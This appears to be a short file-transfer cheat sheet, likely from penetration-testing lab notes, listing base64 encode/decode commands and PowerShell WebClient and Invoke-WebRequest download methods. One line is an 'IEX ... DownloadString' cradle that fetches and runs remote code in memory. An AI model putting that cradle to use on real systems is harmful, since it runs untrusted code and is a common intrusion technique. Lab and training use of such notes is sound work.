**Binary to BASE64**
cat file.txt | base64 -w 0;echo
base64 file.txt > file.b64

Powershell:
$base64 = "SFRCe3sxMjN9Cg=="
[System.IO.File]::WriteAllBytes("file.txt",[System.Convert]::FromBase64String($base64))

**.NET DownloadFile()**
(New-Object Net.WebClient).DownloadFile(
  'https://example.com/test.txt',
  'C:\Temp\test.txt'
)

**.NET DownloadFileAsync()**
(New-Object Net.WebClient).DownloadFileAsync(
  'https://example.com/test.txt',
  'C:\Temp\test.txt'
)

**.NET DownloadString(URL)**
IEX (New-Object Net.WebClient).DownloadString('https://example.com/test.txt')

**Invoke-WebRequest**
Invoke-WebRequest https://example.com/test.txt -OutFile test.txt -UseBasicParsing

